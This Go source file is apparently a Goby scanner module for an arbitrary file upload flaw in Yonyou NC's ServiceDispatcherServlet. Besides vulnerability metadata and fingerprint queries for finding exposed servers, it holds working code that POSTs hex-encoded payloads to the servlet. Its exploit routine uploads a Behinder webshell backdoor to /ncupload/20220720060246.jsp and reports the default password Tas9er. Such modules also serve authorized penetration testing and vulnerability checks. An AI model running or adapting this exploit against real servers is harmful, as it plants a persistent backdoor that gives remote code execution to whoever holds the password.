package exploits

import (
	"encoding/hex"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Yonyou NC ServiceDispatcherServlet file upload vulnerability",
    "Description": "<p>Yonyou NC is a management software for group enterprises under China Yonyou Group.</p><p>There is an arbitrary file upload vulnerability in Yonyou NC ServiceDispatcherServlet routing, attackers can upload arbitrary files, execute arbitrary code on the server, obtain webshell, etc.</p>",
    "Impact": "<p>There is an arbitrary file upload vulnerability in UFIDA NC ServiceDispatcherServlet routing, attackers can upload arbitrary files, execute arbitrary code on the server, obtain webshell, etc.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "yonyou-NC-Cloud",
    "VulType": [
        "Code Execution"
    ],
    "Tags": [
        "Code Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "用友 NC ServiceDispatcherServlet 文件上传漏洞",
            "Product": "用友-NC-Cloud",
            "Description": "<p>用友 NC 是中国用友集团旗下一款面向集团企业的管理软件。</p><p>用友 NC ServiceDispatcherServlet 路由存在任意文件上传漏洞，攻击者可以上传任意文件，在服务器上执行任意代码，获取 webshell 等。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Impact": "<p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">用友 NC&nbsp;</span><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">ServiceDispatcherServlet&nbsp;</span><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">路由存在任意文件上传漏洞，攻击者可以上传任意文件，在服务器上执行任意代码，获取 webshell 等。</span><br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Yonyou NC ServiceDispatcherServlet file upload vulnerability",
            "Product": "yonyou-NC-Cloud",
            "Description": "<p>Yonyou NC is a management software for group enterprises under China Yonyou Group.</p><p>There is an arbitrary file upload vulnerability in Yonyou NC ServiceDispatcherServlet routing, attackers can upload arbitrary files, execute arbitrary code on the server, obtain webshell, etc.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>There is an arbitrary file upload vulnerability in UFIDA NC ServiceDispatcherServlet routing, attackers can upload arbitrary files, execute arbitrary code on the server, obtain webshell, etc.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "FofaQuery": "banner=\"nccloud\" || header=\"nccloud\" || (body=\"/platform/yonyou-yyy.js\" && body=\"/platform/ca/nccsign.js\") || body=\"window.location.href=\\\"platform/pub/welcome.do\\\";\" || (body=\"UFIDA\" && body=\"logo/images/\") || body=\"logo/images/ufida_nc.png\" || title=\"Yonyou NC\" || body=\"<div id=\\\"nc_text\\\">\" || body=\"<div id=\\\"nc_img\\\" onmouseover=\\\"overImage('nc');\" || (title==\"产品登录界面\" && body=\"UFIDA NC\") || body=\"/Client/Uclient/UClient.dmg\"",
    "GobyQuery": "banner=\"nccloud\" || header=\"nccloud\" || (body=\"/platform/yonyou-yyy.js\" && body=\"/platform/ca/nccsign.js\") || body=\"window.location.href=\\\"platform/pub/welcome.do\\\";\" || (body=\"UFIDA\" && body=\"logo/images/\") || body=\"logo/images/ufida_nc.png\" || title=\"Yonyou NC\" || body=\"<div id=\\\"nc_text\\\">\" || body=\"<div id=\\\"nc_img\\\" onmouseover=\\\"overImage('nc');\" || (title==\"产品登录界面\" && body=\"UFIDA NC\") || body=\"/Client/Uclient/UClient.dmg\"",
    "Author": "su18@javaweb.org",
    "Homepage": "https://hc.yonyou.com/product.php?id=4",
    "DisclosureDate": "2022-02-15",
    "References": [],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "CVSSScore": "10",
    "PocId": "10831"
}`

	uploadDataToNC231231414 := func(u *httpclient.FixUrl, data string) {
		cfg := httpclient.NewPostRequestConfig("/ServiceDispatcherServlet")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Header.Store("Content-Type", "application/octet-stream")
		cfg.Data = data
		httpclient.DoHttpRequest(u, cfg)
	}
	checkPocFileExist2391031 := func(u *httpclient.FixUrl, uri string, content string) bool {
		cfg := httpclient.NewGetRequestConfig(uri)
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil && resp.StatusCode == 200 {
			if strings.Contains(resp.Utf8Html, content) {
				return true
			}
		}
		return false
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			payload, _ := hex.DecodeString("000001547271890390CEA362632F6E8819F73AC2FA807D6C4339EDC09EC33877DA87BA2DFC2DE877878483C37766FAD87B63C2848D9120C873768876781AFE3E28D926ABCB12FC7957D76717FCCBE16C9A34A1B9196A26042E4DFED1333B00496FEB7BAF4F1983E881321E262CD2EF76738F9AEA3342756481046FB078343E8FAD5FDDA1354C4C4BA4734671F9CDFBB0B1C6F980ABDE21D20D7FD7E1E8A165931CB64DD59A04B00A34E0D43A597D2087FA2CE3875F37B0BC578FCF97EBACD26C69052EBDD1CC174657C703A965879E642B6F484D8691B73F4616E48864AF1803F7FB4FDC057BA0AC74C1B08028E261408CC43CA0F90994015BD25C32D77383EBE48986DF180248A82134D6F68E03A16C131A973475989CB146DA3A47C1B00A113C3F46475CD4AD6E653615A7D2B766243C922585FBA061EF916DFE65E081C5722131181CC1799B5979429CFDD1B159AD28C7F9CA307A51C7")
			uploadDataToNC231231414(u, string(payload))
			return checkPocFileExist2391031(u, "/ncupload/test.jsp", "test_test")
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			payload, _ := hex.DecodeString("0000048472718903AD41F218963D5E71B256E434249CE21354CEBE95F6708F4E7828E37E1A5A2A181DA99D2D08BF636C1855825B9D43C34D7F6E253366B4CDEB70508D8B3D0C4C9757D1576E7F45E6B9D3D4AAADE770BF7524AD6D61B9A225A942F521DBD1593BE0AE0969EE4FE4C353AA12EB4026DBED6457DD5FBD2F23F200AABC8576E79C50FA5CBC4ABAEBB64AE66BC6265F87C436636BC9BF85F8A4767E84F1850C1A52218A505A0911A74C77C6F00229B58EF825BD70F294689C907D066D9FC954FA06C0A35FEE49841AC6AB28978D9ECD440113F239C4A7D6717C523BBCFDC72AF8F1FBAFBB5096A4A672219106DE6E9D669B364B9CD868469CF4F55ED8FAD40F676BE25E9CAEBC65C271B29C8BDBAE9EB67FA4FD8EA2C196952691B56439915A7C56DA5462D26AC0434588E348C50962021648C4C456D5E77FB33AD7B5327061D7EC3096B762B6A508E3DA107FD368F54653BE92C0D34531D263E906C95686869FF11F1A5F637DE27454DC04A306B7A86E0FAEC3A965E0CAD0E0C79B68F2351A922D7C58C8FD8C4506753ED3DC4FBE438B91FEC4E2F8DBDE0A362C24E68B3BEE7F215C17386C822D2E0875C0D67CADA075FC8B8FDBE011F44C0394CE82B007B500F4BCFE2A0AEFF865E7113F00836CB837B7D0870450E22DFEB9005592F169E2EC5ECE1D6D8926C1ED28B6E3186B12E093C2DD020A7EB06ED2FB9CA0BD018A5568C900969EEF38D243529344FE8241521D1F6C5B043BD74C807430EACD626478C90690670EF84A93A03E92A186F9BA8C8B9E6354EF296CABA65B8FFB5826E25C73E5D12E9D13FE2160F095DF4888EE23CE4FA52CE17BC19F9B6C241143DB83F4E29DDC7BC3CA286E5F7812A1AF077B0036715B16C28EA3ED7272C4C0C15CF8798102D65B4BAF7508AAF09643192B4725008A50931EB34E2215315F5BA25D5E9CFD6939FCEB36BD5E62747140AAFA3DA54DFED9801E0C3B162776B00FE7E04493FDF0BEF36B61C6291D524F3B6C9C04F47A91264F83FF7F832C74CD1F5F837FAA438F73FB8907C90078A6F65A1A511BF91F70B2084052D87C9EC77FEE56648A8CEF74622FE9A5DB8AA9A7AB31B3C06A781C4A83694910373CC0CD6FBB201A2FF427AD8864B04BFA15205D827B77B00E69B2E8286483B7D8A082BDE99ECDBFE42E8962D249776819AD9511373081C9FCAB01AC3C20E1906C56F06A190B7DA164DF49E77C85F828FD77AC91F7AB3DA994CDF58B664CD0F3E2F2EB8BD1D6646E70AEAFDAC65FC8D457614071C8FEC987BA03FC73E92774C6A8D05A87801D68032CE20F3500BB0BB0F32CA29E5EDA15D1E0C41A8325D25809583EDFA11F1D0E378AE80C6422C901A6D66D99195B144AC4483F635646FF485D53E43B6F3D43E08C27E391322223555529D2335ED9935D8C6F626A60A378807C552D31F6CD4C6BB69B91276B9DC2E983167F63CC38D402ABAB5A9C52BA54950DBDA4A36329A9CDFCF082D0FCDF5BE0A11E30B80B323812C232F1C6C81E0B6AB281DC3314F3A920FEF55E81FB77B8232CDA25984B808E532252A9BE19BA1F5239BB08AB323C4A22A008790B2CB3AE327B30C1F5ADB394918DCD3FA76F416D3DE97ECB9FDD1CDDA5C8F1C9B602F2DA")
			uploadDataToNC231231414(expResult.HostInfo, string(payload))
			if checkPocFileExist2391031(expResult.HostInfo, "/ncupload/20220720060246.jsp", "Good Morning Teacher") {
				expResult.Success = true
				expResult.Output = "攻击已成功，冰蝎后门已上传，访问路径 /ncupload/20220720060246.jsp，默认密码 Tas9er"
			}
			return expResult
		},
	))
}
